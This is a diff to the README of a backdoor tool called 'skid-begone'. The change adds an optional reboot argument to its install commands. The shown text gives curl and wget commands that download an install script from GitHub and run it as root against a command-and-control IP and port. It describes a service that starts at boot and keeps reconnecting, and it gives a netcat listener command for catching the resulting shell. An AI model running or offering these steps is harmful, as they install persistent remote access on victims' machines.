@@ -28,21 +28,23 @@ One day they will learn the hard way...
 
 ### Actually running the script (run as root)
 
+Note: If you want the backdoored machine to reboot, append `reboot` to the commandline arguments, as denoted by `[reboot]`
+
 ```sh
 curl -sSL https://raw.githubusercontent.com/GermanBread/skid-begone/master/install.sh > /tmp/install.sh
-bash /tmp/install.sh <IP OF THE C&C server> <FREE PORT ON THE C&C SERVER>
+bash /tmp/install.sh <IP OF THE C&C server> <FREE PORT ON THE C&C SERVER> [reboot]
 ```
 
 alternatively with wget:
 
 ```sh
 wget -qq https://raw.githubusercontent.com/GermanBread/skid-begone/master/install.sh -O /tmp/install.sh
-bash /tmp/install.sh <IP OF THE C&C server> <FREE PORT ON THE C&C SERVER>
+bash /tmp/install.sh <IP OF THE C&C server> <FREE PORT ON THE C&C SERVER> [reboot]
 ```
 
 By default the backdoor will start alongside other system services. If the service can't connect to the command and control server, it will wait for a few seconds and reconnect immediately after.
 
-By "command and control server" I mean you, the one reading this right now, listening on the port you specified during install of the backdoor, using netcat (here's the command: `nc -vlp <your port> [reboot]`).
+By "command and control server" I mean you, the one reading this right now, listening on the port you specified during install of the backdoor, using netcat (here's the command: `nc -vlp <your port>`).
 
 ### Uninstalling (run as root)
 
